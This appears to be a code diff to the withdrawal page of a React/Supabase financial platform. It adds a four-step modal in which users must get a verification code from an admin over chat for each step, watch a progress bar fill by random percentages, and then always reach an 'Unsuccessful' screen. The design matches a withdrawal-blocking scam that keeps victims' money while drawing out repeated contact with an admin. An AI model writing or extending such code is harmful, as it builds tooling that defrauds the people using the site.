@@ -26,6 +26,14 @@ export default function WithdrawalPage() {
   const [selectedMethod, setSelectedMethod] = useState("");
   const [submitting, setSubmitting] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
+  const [showProcessModal, setShowProcessModal] = useState(false);
+  const [currentStep, setCurrentStep] = useState(0); // 0 = not started, 1-4 = steps
+  const [progress, setProgress] = useState(0);
+  const [withdrawalId, setWithdrawalId] = useState(null);
+  const [stepPercentages, setStepPercentages] = useState([]);
+  const [stepCode, setStepCode] = useState("");
+  const [codeError, setCodeError] = useState("");
+  const [isProcessingStep, setIsProcessingStep] = useState(false);
 
   // Crypto withdrawal details
   const [cryptoNetwork, setCryptoNetwork] = useState("");
@@ -101,15 +109,45 @@ export default function WithdrawalPage() {
         return;
       }
 
-      const { data: profileData } = await supabase
+      // Load the user's profile
+      const { data: profileData, error: profileError } = await supabase
         .from("profiles")
         .select("*")
         .eq("id", user.id)
         .single();
 
+      if (profileError) throw profileError;
+
       setProfile(profileData);
+
+      // Find the user's latest unfinished withdrawal
+      const { data: withdrawal, error: withdrawalError } = await supabase
+        .from("withdrawals")
+        .select("id, current_step, progress, step_percentages")
+        .eq("user_id", user.id)
+        .eq("process_completed", false)
+        .order("created_at", { ascending: false })
+        .limit(1)
+        .maybeSingle();
+
+      if (withdrawalError) throw withdrawalError;
+
+      // Restore the unfinished withdrawal
+      if (
+        withdrawal &&
+        withdrawal.current_step >= 1 &&
+        withdrawal.current_step <= 4
+      ) {
+        setWithdrawalId(withdrawal.id);
+        setCurrentStep(withdrawal.current_step);
+        setProgress(withdrawal.progress || 0);
+        setStepPercentages(withdrawal.step_percentages || []);
+        setStepCode("");
+        setCodeError("");
+        setShowProcessModal(true);
+      }
     } catch (error) {
-      console.error("Error:", error);
+      console.error("Error loading withdrawal page:", error);
     } finally {
       setLoading(false);
     }
@@ -157,12 +195,14 @@ export default function WithdrawalPage() {
       setSubmitting(true);
 
       // Create withdrawal record
+      const generatedStepPercentages = generateRandomSteps();
       const withdrawalData = {
         user_id: profile.id,
         amount: withdrawAmount,
         payment_method: selectedMethod,
         currency: profile.currency,
         status: "pending",
+        step_percentages: generatedStepPercentages,
       };
 
       // Add method-specific details
@@ -175,14 +215,16 @@ export default function WithdrawalPage() {
         withdrawalData.account_number = accountNumber;
       }
 
-      const { error } = await supabase
+      const { data: withdrawal, error } = await supabase
         .from("withdrawals")
-        .insert([withdrawalData]);
+        .insert([withdrawalData])
+        .select()
+        .single();
 
       if (error) throw error;
 
-      // Show success message
-      setShowSuccess(true);
+      setWithdrawalId(withdrawal.id);
+      setStepPercentages(withdrawal.step_percentages);
 
       // Reset form
       setAmount("");
@@ -193,11 +235,12 @@ export default function WithdrawalPage() {
       setAccountName("");
       setAccountNumber("");
 
-      // Redirect after 3 seconds
-      setTimeout(() => {
-        setShowSuccess(false);
-        router.push("/user/transactions");
-      }, 3000);
+      // Open the multi-step process modal instead of the toast
+      setShowProcessModal(true);
+      setCurrentStep(1);
+      setProgress(0);
+      setStepCode("");
+      setCodeError("");
     } catch (error) {
       console.error("Error creating withdrawal:", error);
       alert("Failed to submit withdrawal request. Please try again.");
@@ -206,6 +249,56 @@ export default function WithdrawalPage() {
     }
   };
 
+  const handleVerifyCode = async () => {
+    if (!stepCode.trim() || isProcessingStep) return;
+
+    setIsProcessingStep(true);
+    setCodeError("");
+
+    try {
+      const { data, error } = await supabase.rpc("verify_withdrawal_step", {
+        p_withdrawal_id: withdrawalId,
+        p_step_number: currentStep,
+        p_code: stepCode.trim(),
+      });
+
+      if (error) throw error;
+
+      setProgress(data.progress);
+      setCurrentStep(data.current_step);
+      setStepCode("");
+    } catch (error) {
+      console.error("Verification error:", error);
+
+      setCodeError(
+        error.message.includes("Invalid verification code")
+          ? "Invalid code. Please contact admin for the correct code."
+          : error.message,
+      );
+    } finally {
+      setIsProcessingStep(false);
+    }
+  };
+
+  // Generate 4 random percentages that always add up to 100
+  const generateRandomSteps = () => {
+    const cuts = [];
+
+    while (cuts.length < 3) {
+      const number = Math.floor(Math.random() * 99) + 1;
+
+      if (!cuts.includes(number)) {
+        cuts.push(number);
+      }
+    }
+
+    cuts.sort((a, b) => a - b);
+
+    return [cuts[0], cuts[1] - cuts[0], cuts[2] - cuts[1], 100 - cuts[2]];
+  };
+
+  // Temporary hardcoded codes (admin will later provide real ones via chat)
+  // You can change these values
   if (loading) {
     return (
       <div
@@ -278,6 +371,140 @@ export default function WithdrawalPage() {
             <p className="text-sm opacity-90">
               Your request is being processed
             </p>
+          </div>
+        </div>
+      )}
+
+      {/* Withdrawal Process Modal */}
+      {showProcessModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
+          <div
+            className={`w-full max-w-md rounded-2xl p-6 border shadow-2xl ${
+              isDarkMode
+                ? "bg-slate-900 border-slate-700"
+                : "bg-white border-indigo-200"
+            }`}
+          >
+            <h2
+              className={`text-2xl font-bold mb-2 ${
+                isDarkMode ? "text-white" : "text-gray-900"
+              }`}
+            >
+              Processing Withdrawal
+            </h2>
+            <p
+              className={`text-sm mb-6 ${
+                isDarkMode ? "text-slate-400" : "text-gray-600"
+              }`}
+            >
+              {currentStep <= 4
+                ? `Step ${currentStep} of 4 — Contact admin via chat for the verification code`
+                : "Verification process complete"}
+            </p>
+
+            {/* Progress Bar */}
+            <div className="mb-6">
+              <div
+                className={`w-full h-3 rounded-full overflow-hidden ${
+                  isDarkMode ? "bg-slate-800" : "bg-gray-200"
+                }`}
+              >
+                <div
+                  className="h-full bg-gradient-to-r from-emerald-500 to-teal-500 transition-all duration-700 ease-out"
+                  style={{ width: `${progress}%` }}
+                />
+              </div>
+              <p
+                className={`text-right text-sm mt-1 font-medium ${
+                  isDarkMode ? "text-emerald-400" : "text-indigo-600"
+                }`}
+              >
+                {progress}%
+              </p>
+            </div>
+
+            {/* Code Input (only shown when waiting for code) */}
+            {!isProcessingStep && currentStep <= 4 && (
+              <div className="space-y-4">
+                <div>
+                  <label
+                    className={`block text-sm font-medium mb-2 ${
+                      isDarkMode ? "text-white" : "text-gray-900"
+                    }`}
+                  >
+                    Enter Step {currentStep} Code
+                  </label>
+                  <input
+                    type="text"
+                    value={stepCode}
+                    onChange={(e) => {
+                      setStepCode(e.target.value.toUpperCase());
+                      setCodeError("");
+                    }}
+                    placeholder="Enter code from admin"
+                    className={`w-full px-4 py-3 rounded-lg border focus:outline-none focus:ring-2 font-mono tracking-widest text-center text-lg ${
+                      isDarkMode
+                        ? "bg-slate-800 border-slate-700 text-white focus:ring-emerald-500"
+                        : "bg-white border-indigo-200 text-gray-900 focus:ring-indigo-500"
+                    }`}
+                  />
+                  {codeError && (
+                    <p className="text-red-500 text-sm mt-2">{codeError}</p>
+                  )}
+                </div>
+
+                <button
+                  onClick={handleVerifyCode}
+                  disabled={!stepCode.trim() || isProcessingStep}
+                  className={`w-full py-3 rounded-xl font-bold transition-all ${
+                    isDarkMode
+                      ? "bg-emerald-500 hover:bg-emerald-600 text-white disabled:opacity-50"
+                      : "bg-indigo-600 hover:bg-indigo-700 text-white disabled:opacity-50"
+                  }`}
+                >
+                  Verify & Continue
+                </button>
+              </div>
+            )}
+
+            {/* Processing indicator while progress is animating */}
+            {isProcessingStep && (
+              <div className="text-center py-6">
+                <div className="w-12 h-12 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin mx-auto mb-4" />
+                <p className={isDarkMode ? "text-slate-400" : "text-gray-600"}>
+                  Processing step {currentStep}...
+                </p>
+              </div>
+            )}
+
+            {/* Final unsuccessful message */}
+            {currentStep > 4 && (
+              <div className="text-center py-4">
+                <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
+
+                <h3 className="text-xl font-bold mb-2">Unsuccessful</h3>
+
+                <p
+                  className={`text-sm mb-6 ${
+                    isDarkMode ? "text-slate-400" : "text-gray-600"
+                  }`}
+                >
+                  Your withdrawal process could not be completed. Please contact
+                  support for assistance.
+                </p>
+
+                <button
+                  onClick={() => setShowProcessModal(false)}
+                  className={`w-full py-3 rounded-xl font-bold ${
+                    isDarkMode
+                      ? "bg-emerald-500 hover:bg-emerald-600 text-white"
+                      : "bg-indigo-600 hover:bg-indigo-700 text-white"
+                  }`}
+                >
+                  Close
+                </button>
+              </div>
+            )}
           </div>
         </div>
       )}
